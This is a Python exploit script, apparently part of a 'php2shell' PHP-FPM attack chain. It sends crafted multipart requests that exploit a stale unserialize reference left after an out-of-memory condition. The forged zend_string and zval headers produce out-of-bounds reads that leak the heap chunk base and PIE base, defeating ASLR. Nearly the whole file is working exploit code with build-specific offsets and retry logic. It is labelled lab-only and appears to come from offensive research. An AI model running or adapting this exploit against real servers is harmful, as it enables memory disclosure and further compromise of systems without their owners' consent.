#!/usr/bin/env python3
"""php2shell 8M FPM HTTP-only chunk/PIE leak (project reimplementation).

Two requests against the stale ``BG(unserialize)`` left by the producer OOM:

  stage 1  a 4KB text field with pads [7168, 1024] is placed so that the
           surviving stale var_hash entry (R:2 -> the L string) points at a
           forged zend_string header inside the field.  `echo r` reads
           0x15810 bytes of the chunk; a heap pointer at r+0x28e8 yields the
           2MB-aligned Zend-MM chunk base.

  stage 2  the same stale entry is overwritten with a fake zval pointing at
           the real chunk header at chunk+0x1d0, whose len field is 0xc503.
           The OOB read reaches two PCRE callbacks at chunk+0x2020/0x4020;
           the stable one at r+0x3e38 is php_pcre_efree.  Subtracting the
           build's php_pcre_efree offset yields the PIE base.

No gdb, /proc, or pre-known absolute address is used.  The offsets depend on
the build and request shape; they are calibrated for the 8.4.26 debug FPM
build in the lab (docs/research/fpm-8m-http-leak.md).  Lab-only; authorized
targets only.
"""
from __future__ import annotations

import argparse
import json
import os
import struct
import sys
import time

from fpm_reclaim import BND, Target, mp

# stage 1 geometry
S1_PADS = (7168, 1024)
S1_SIZE = 4096
S1_HDR = 0x7E8
S1_READ = 0x15810
S1_LEN = 0x15810

# stage 2 geometry
S2_SIZE = 16384
S2_ZVAL_OFF = 0x8
S2_FAKE_HDR = 0x1D0
S2_READ = 0xC503
S2_PIE_PTR = 0x3E38

# official stripped build: the stage-1 read window may contain a dense handler
# table at read+0x2808 (fresh worker only, pie+0x6a60aa); it disappears once
# the worker crashed and the master respawned it.  Kept as a fast path.
OFFICIAL_PIE_PTR = 0x2808
OFFICIAL_PIE_OFF = 0x6A60AA

# official stage 2: a stable fake-string header at chunk+0x56c60 (len
# 0x15833) whose read window reaches the 56-byte handler table at
# chunk+0x58030; read+0x13b8 = pie+0x7038e0.  Present on respawned workers.
OFFICIAL_S2_SIZE = 16384
OFFICIAL_S2_ZVAL_OFF = 0x8
OFFICIAL_S2_H = 0x56C60
OFFICIAL_S2_READ = 0x15833
OFFICIAL_S2_PIE_PTR = 0x13B8
OFFICIAL_S2_PIE_OFF = 0x7038E0

IS_STRING_EX = 0x106
CHUNK_SIZE = 0x200000


def _dechunk(body: bytes) -> bytes:
    """Decode an HTTP chunked body; return it unchanged when not chunked."""
    if not body or body[0:1] not in b"0123456789abcdefABCDEF":
        return body
    out = bytearray()
    pos = 0
    while pos < len(body):
        eol = body.find(b"\r\n", pos)
        if eol < 0:
            break
        try:
            size = int(body[pos:eol], 16)
        except ValueError:
            return body
        pos = eol + 2
        if size == 0:
            break
        out += body[pos:pos + size]
        pos += size
        if body[pos:pos + 2] == b"\r\n":
            pos += 2
    return bytes(out)


def _leak_body(app: Target, parts, sid: str, read_len: int) -> bytes:
    body = mp(parts, BND)
    status, raw = app.post("/app.php", body, cookie="PHPSESSID=" + sid,
                           read_cap=max(1 << 20, read_len + 0x1000))
    raw = _dechunk(raw)
    idx = raw.find(b"r\t")
    if status != 200 or idx < 0:
        raise RuntimeError("leak request failed (status=%d, r=%d)" % (status, idx))
    return raw[idx + 2:idx + 2 + read_len]


def _arm(builder: Target, app: Target, sid: str, arm_path: str) -> None:
    st, _ = builder.get(arm_path, cookie="PHPSESSID=" + sid)
    if st != 200:
        raise RuntimeError("arm failed (%d)" % st)
    st, _ = app.get("/app.php", cookie="PHPSESSID=" + sid)
    if st != 200:
        raise RuntimeError("producer failed (%d)" % st)


def _ref(builder: Target, ref_path: str, ref_sid: str) -> None:
    body = mp([(b"x", b"1", None)], BND)
    st, _ = builder.post(ref_path, body, cookie="PHPSESSID=" + ref_sid)
    if st != 200:
        raise RuntimeError("ref failed (%d)" % st)


def _parts_with_pads(pads, big: bytes):
    parts = [(b"pad%d" % i, b"\x00" * pad, None) for i, pad in enumerate(pads)]
    parts.append((b"big", big, None))
    parts.append((b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn", None))
    parts.append((b"f", b"x" * 8, b"a.txt"))
    return parts


def _find_chunk(tail: bytes) -> int:
    """Majority vote over 2MB-aligned bases of plausible heap pointers."""
    counts: dict[int, int] = {}
    for pos in range(0, len(tail) - 8, 8):
        value = struct.unpack_from("<Q", tail, pos)[0]
        if value >= (1 << 48):
            continue
        raw = value.to_bytes(8, "little")
        if len(set(raw)) <= 2:            # repeated-byte fill / zeros
            continue
        base = value & ~(CHUNK_SIZE - 1)
        off = value - base
        if base >= 0x100000000 and 0x1000 <= off < CHUNK_SIZE:
            counts[base] = counts.get(base, 0) + 1
    if not counts:
        raise RuntimeError("stage1 no heap pointer candidates")
    base, votes = max(counts.items(), key=lambda item: item[1])
    if votes < 2:
        raise RuntimeError("stage1 no stable chunk base (%d vote)" % votes)
    return base


def stage1_tail(base: Target, builder: Target, app: Target, sid: str,
                ref_sid: str, arm_path: str = "/bigvar.php",
                ref_path: str = "/ref.php") -> tuple[int, bytes]:
    _arm(builder, app, sid, arm_path)
    _ref(builder, ref_path, ref_sid)
    big = bytearray(b"\x00" * S1_SIZE)
    struct.pack_into("<I", big, S1_HDR, 0x40000000)
    struct.pack_into("<I", big, S1_HDR + 4, 6)
    struct.pack_into("<Q", big, S1_HDR + 8, 0)
    struct.pack_into("<Q", big, S1_HDR + 0x10, S1_LEN)
    big[S1_HDR + 0x18:] = b"Q" * (S1_SIZE - S1_HDR - 0x18)
    tail = _leak_body(app, _parts_with_pads(S1_PADS, bytes(big)), ref_sid,
                      S1_READ)
    if len(tail) < S1_READ:
        raise RuntimeError("stage1 short read (%d)" % len(tail))
    return _find_chunk(tail), tail


def stage1_chunk(base: Target, builder: Target, app: Target, sid: str,
                 ref_sid: str, arm_path: str = "/bigvar.php",
                 ref_path: str = "/ref.php") -> int:
    chunk, _tail = stage1_tail(base, builder, app, sid, ref_sid,
                               arm_path, ref_path)
    return chunk


def official_pie(tail: bytes) -> int:
    ptr = struct.unpack_from("<Q", tail, OFFICIAL_PIE_PTR)[0]
    pie = ptr - OFFICIAL_PIE_OFF
    if pie & 0xFFF or not (0x400000000000 <= pie < 0x800000000000):
        raise RuntimeError("official bad PIE pointer 0x%x (pie 0x%x)"
                           % (ptr, pie))
    return pie


def stage2_pie(base: Target, builder: Target, app: Target, sid: str,
               ref_sid: str, chunk: int, pcre_efree: int,
               arm_path: str = "/bigvar.php",
               ref_path: str = "/ref.php") -> int:
    _arm(builder, app, sid, arm_path)
    _ref(builder, ref_path, ref_sid)
    big = bytearray(b"\x00" * S2_SIZE)
    struct.pack_into("<Q", big, S2_ZVAL_OFF, chunk + S2_FAKE_HDR)
    struct.pack_into("<I", big, S2_ZVAL_OFF + 8, IS_STRING_EX)
    tail = _leak_body(app, _parts_with_pads((), bytes(big)), ref_sid, S2_READ)
    if len(tail) < S2_PIE_PTR + 8:
        raise RuntimeError("stage2 short read (%d)" % len(tail))
    ptr = struct.unpack_from("<Q", tail, S2_PIE_PTR)[0]
    pie = ptr - pcre_efree
    if pie & 0xFFF or not (0x400000000000 <= pie < 0x800000000000):
        raise RuntimeError("stage2 bad PIE pointer 0x%x (pie 0x%x)" % (ptr, pie))
    return pie


def stage2_pie_official(base: Target, builder: Target, app: Target,
                        sid: str, ref_sid: str, chunk: int,
                        arm_path: str = "/bigvar.php",
                        ref_path: str = "/ref.php") -> int:
    """Official stripped build: fake zval -> chunk+0x56c60 header table."""
    _arm(builder, app, sid, arm_path)
    _ref(builder, ref_path, ref_sid)
    big = bytearray(b"\x00" * OFFICIAL_S2_SIZE)
    struct.pack_into("<Q", big, OFFICIAL_S2_ZVAL_OFF, chunk + OFFICIAL_S2_H)
    struct.pack_into("<I", big, OFFICIAL_S2_ZVAL_OFF + 8, IS_STRING_EX)
    tail = _leak_body(app, _parts_with_pads((), bytes(big)), ref_sid,
                      OFFICIAL_S2_READ)
    if len(tail) < OFFICIAL_S2_PIE_PTR + 8:
        raise RuntimeError("official stage2 short read (%d)" % len(tail))
    ptr = struct.unpack_from("<Q", tail, OFFICIAL_S2_PIE_PTR)[0]
    pie = ptr - OFFICIAL_S2_PIE_OFF
    if pie & 0xFFF or not (0x400000000000 <= pie < 0x800000000000):
        raise RuntimeError("official stage2 bad PIE pointer 0x%x (pie 0x%x)"
                           % (ptr, pie))
    return pie


def _new_sid(prefix: str) -> str:
    return prefix + os.urandom(6).hex()


def leak_bases(base_url: str, builder_url: str, *, sid: str | None,
               ref_sid: str | None, pcre_efree: int | None = None,
               arm_path: str = "/bigvar.php",
               ref_path: str = "/ref.php",
               profile: str = "debug") -> tuple[int, int]:
    base = Target(base_url)
    builder = Target(builder_url)
    app = Target(base_url.rstrip("/") + "/app.php")
    sid1 = sid or _new_sid("fmroom")
    ref1 = ref_sid or _new_sid("fpmref")
    if profile == "official":
        last_exc: Exception | None = None
        try:
            app.get("/index.php")
        except OSError:
            pass
        for attempt in range(4):
            if attempt:
                sid1 = _new_sid("fmroom")
                ref1 = _new_sid("fpmref")
                time.sleep(0.2)
            print("[*] stage1: chunk leak (attempt %d)" % (attempt + 1),
                  file=sys.stderr)
            try:
                chunk, tail = stage1_tail(base, builder, app, sid1, ref1,
                                          arm_path, ref_path)
            except (OSError, RuntimeError) as exc:
                last_exc = exc
                print("[!] stage1: %s" % exc, file=sys.stderr)
                time.sleep(0.3)
                continue
            try:
                pie = official_pie(tail)
            except RuntimeError as exc:
                last_exc = exc
                print("[!] stage1 PIE table: %s" % exc, file=sys.stderr)
                sid2 = _new_sid("fmroom")
                ref2 = _new_sid("fpmref")
                print("[*] stage2: PIE leak via chunk+0x56c60", file=sys.stderr)
                try:
                    pie = stage2_pie_official(base, builder, app, sid2, ref2,
                                              chunk, arm_path, ref_path)
                except (OSError, RuntimeError) as exc2:
                    last_exc = exc2
                    print("[!] %s" % exc2, file=sys.stderr)
                    continue
            print("[*] official: chunk=0x%x pie=0x%x" % (chunk, pie),
                  file=sys.stderr)
            return chunk, pie
        if last_exc is not None:
            raise last_exc
        raise RuntimeError("official leak failed")
    print("[*] stage1: chunk leak", file=sys.stderr)
    chunk, _tail = stage1_tail(base, builder, app, sid1, ref1,
                               arm_path, ref_path)
    print("[*] stage1: chunk=0x%x" % chunk, file=sys.stderr)
    if profile != "debug":
        raise RuntimeError("unknown leak profile %r" % profile)
    if pcre_efree is None:
        raise RuntimeError("debug profile requires pcre_efree")
    sid2 = _new_sid("fmroom")
    ref2 = _new_sid("fpmref")
    print("[*] stage2: PIE leak", file=sys.stderr)
    pie = stage2_pie(base, builder, app, sid2, ref2, chunk, pcre_efree,
                     arm_path, ref_path)
    print("[*] stage2: pie=0x%x" % pie, file=sys.stderr)
    return chunk, pie


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--base", required=True, help="chain URL")
    ap.add_argument("--builder", required=True, help="builder URL (64M pool)")
    ap.add_argument("--arm", default="/bigvar.php")
    ap.add_argument("--ref", default="/ref.php")
    ap.add_argument("--sid", default=None,
                    help="producer session id (random when omitted)")
    ap.add_argument("--ref-sid", default=None,
                    help="ref session id (random when omitted)")
    ap.add_argument("--pcre-efree", type=lambda x: int(x, 0),
                    default=0x31D400,
                    help="php_pcre_efree symbol offset (debug profile)")
    ap.add_argument("--profile", choices=("debug", "official"),
                    default="debug",
                    help="debug: two-stage; official: single-stage")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()
    try:
        chunk, pie = leak_bases(args.base, args.builder, sid=args.sid,
                                ref_sid=args.ref_sid,
                                pcre_efree=args.pcre_efree,
                                arm_path=args.arm, ref_path=args.ref,
                                profile=args.profile)
    except (OSError, RuntimeError) as exc:
        print("[!] %s" % exc, file=sys.stderr)
        return 1
    if args.json:
        print(json.dumps({"chunk": hex(chunk), "pie": hex(pie)}))
    else:
        print("chunk=0x%x pie=0x%x" % (chunk, pie))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
